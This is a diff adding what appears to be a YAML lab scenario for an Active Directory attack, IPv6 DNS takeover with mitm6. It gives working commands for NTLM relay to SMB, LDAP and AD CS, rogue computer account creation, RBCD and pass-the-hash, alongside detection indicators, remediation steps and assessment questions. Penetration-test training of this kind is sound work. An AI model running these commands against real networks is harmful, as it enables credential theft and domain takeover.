@@ -1,0 +1,166 @@
+# Category: Active Directory - Network Poisoning
+name: "IPv6 DNS Takeover — mitm6 for Credential Relay and WPAD Abuse"
+id: "ad-network-ipv6-dns-takeover-001"
+category: "active_directory"
+subcategory: "network_poisoning"
+difficulty: "advanced"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit IPv6 multicast features to become the default DNS server on a Windows
+  network using mitm6. By responding to DHCPv6 and ICMPv6 requests, an attacker
+  can configure themselves as the DNS server for target machines, redirecting
+  traffic to attacker-controlled servers and capturing or relaying credentials
+  via WPAD (Web Proxy Auto-Discovery) and other protocols.
+
+learning_objectives:
+  - Understand IPv6 multicast and DHCPv6 in Windows environments
+  - Deploy mitm6 for DNS server takeover
+  - Combine with ntlmrelayx for credential relay attacks
+  - Disable IPv6 or secure DHCPv6 to prevent takeover
+
+tools:
+  - mitm6
+  - ntlmrelayx.py (impacket)
+  - responder
+  - impacket
+  - dnsmasq
+
+prerequisites:
+  - Network access to target subnet (Layer 2)
+  - IPv6 enabled on target network (default in Windows)
+  - DHCPv6 not secured or not deployed
+  - Understanding of IPv6 multicast protocols
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Verify IPv6 and DHCPv6 status on network"
+    commands:
+      - "# Check if IPv6 is enabled on target subnet"
+      - "ip -6 addr show"
+      - "# Monitor for ICMPv6 Router Solicitations"
+      - "tcpdump -i [interface] icmp6"
+      - "# Monitor for DHCPv6 traffic"
+      - "tcpdump -i [interface] port 546 or port 547"
+      - "# Check Windows IPv6 configuration"
+      - "netsh interface ipv6 show address"
+      - "# Check if WPAD is enabled"
+      - "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings /v AutoDetect"
+    expected_output: "Confirmation of IPv6 traffic and DHCPv6 activity on network"
+    detection: "Network scanning; IPv6 multicast monitoring"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Start mitm6 to take over DNS"
+    commands:
+      - "# Basic mitm6 setup"
+      - "mitm6 -d [domain] -i [interface]"
+      - "# mitm6 with specific options"
+      - "mitm6 -d [domain] -i [interface] --ignore-nofqdn"
+      - "# Target specific hosts"
+      - "mitm6 -d [domain] -i [interface] -hw [target_mac]"
+      - "# Combine with ntlmrelayx in another terminal"
+      - "# Terminal 1:"
+      - "mitm6 -d [domain] -i [interface]"
+      - "# Terminal 2:"
+      - "ntlmrelayx.py -6 -wh [attacker_ip] -t smb://[target_ip] -l /tmp -i"
+    expected_output: "mitm6 responding to DHCPv6 requests; targets using attacker as DNS"
+    detection: "Unexpected DHCPv6 responses; DNS queries to attacker IP"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Capture credentials via WPAD and relay"
+    commands:
+      - "# ntlmrelayx with WPAD and IPv6"
+      - "ntlmrelayx.py -6 -wh [attacker_ip] -t smb://[target_ip] -wa [attacker_ip]"
+      - "# Relay to LDAP for account creation"
+      - "ntlmrelayx.py -6 -wh [attacker_ip] -t ldap://[dc_ip] --delegate-access"
+      - "# Relay to AD CS for certificate (ESC8)"
+      - "ntlmrelayx.py -6 -wh [attacker_ip] -t http://[ca_server]/certsrv/certfnsh.asp --adcs"
+      - "# Full attack chain"
+      - "ntlmrelayx.py -6 -wh [attacker_ip] -t ldaps://[dc_ip] --add-computer [computer_name]"
+    expected_output: "Credentials captured and relayed; potential account creation or certificate issuance"
+    detection: "WPAD requests to attacker; NTLM relay traffic"
+
+  - id: "step4"
+    phase: "post_exploitation"
+    action: "Use relayed credentials for domain compromise"
+    commands:
+      - "# Use created computer account for RBCD"
+      - "rbcd.py '[domain]/[computer_name]$:[password]'@'[dc_ip]' -action write -delegate-from '[computer_name]$' -delegate-to '[target_computer]'"
+      - "# Or use obtained certificate"
+      - "certipy auth -pfx [relay_output].pfx -dc-ip [dc_ip]"
+      - "# Or use extracted NTLM hash"
+      - "impacket-psexec -hashes ':[ntlm_hash]' '[domain]/[username]@[target_ip]'"
+    expected_output: "Domain compromise via relayed credentials"
+    detection: "Account creation from unexpected source; certificate issuance"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1557"
+    description: "Man-in-the-Middle"
+  - standard: "MITRE ATT&CK"
+    control: "T1550"
+    description: "Use Alternate Authentication Material"
+  - standard: "NIST 800-53 Rev5"
+    control: "SC-8"
+    description: "Transmission Confidentiality and Integrity"
+  - standard: "CIS Controls v8"
+    control: "12.1"
+    description: "Ensure that only approved ports, protocols, and services are running"
+
+detection:
+  network_indicators:
+    - "DHCPv6 responses from non-authorized servers"
+    - "DNS queries to unexpected IPv6 addresses"
+    - "WPAD requests to attacker-controlled servers"
+  log_indicators:
+    - "Event ID 4648: Explicit Credential Logon via WPAD"
+    - "Event ID 4624: Logon Type 3 from unexpected source"
+    - "Event ID 4768: Kerberos TGT requests after WPAD authentication"
+    - "Defender for Identity: Suspicious WPAD activity"
+  endpoint_indicators:
+    - "mitm6 process execution"
+    - "ntlmrelayx.py with -6 flag"
+    - "IPv6 DNS server changes on workstations"
+    - "WPAD proxy configuration changes"
+
+remediation:
+  immediate:
+    - "Disable IPv6 on all systems if not required"
+    - "Block DHCPv6 traffic at network switches/firewalls"
+    - "Disable WPAD via Group Policy"
+    - "Enable SMB signing and LDAP signing"
+  long_term:
+    - "Deploy DHCPv6 guard on switches"
+    - "Implement RA guard for IPv6 router advertisements"
+    - "Use authenticated DHCPv6 with certificates"
+    - "Monitor for rogue DHCPv6 servers"
+    - "Deploy Microsoft Defender for Identity"
+
+variables:
+  domain: "corp.example.com"
+  dc_ip: "192.168.1.10"
+  interface: "eth0"
+  attacker_ip: "192.168.1.50"
+  target_ip: "192.168.1.100"
+  target_mac: "00:11:22:33:44:55"
+  target_computer: "DC01"
+  computer_name: "FAKEPC01"
+  password: "Password123!"
+  ntlm_hash: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+
+assessment_questions:
+  - "How does mitm6 exploit IPv6 to become the DNS server?"
+  - "What is WPAD and how does it enable credential capture?"
+  - "Why is IPv6 often overlooked in network security?"
+  - "What mitigations prevent IPv6 DNS takeover?"
+
+references:
+  - url: "https://github.com/fox-it/mitm6"
+    title: "mitm6 - IPv6 DNS Takeover Tool"
+  - url: "https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/"
+    title: "mitm6: Compromising IPv4 Networks via IPv6 - Fox-IT"
+  - url: "https://attack.mitre.org/techniques/T1557/"
+    title: "MITRE ATT&CK - Man-in-the-Middle"
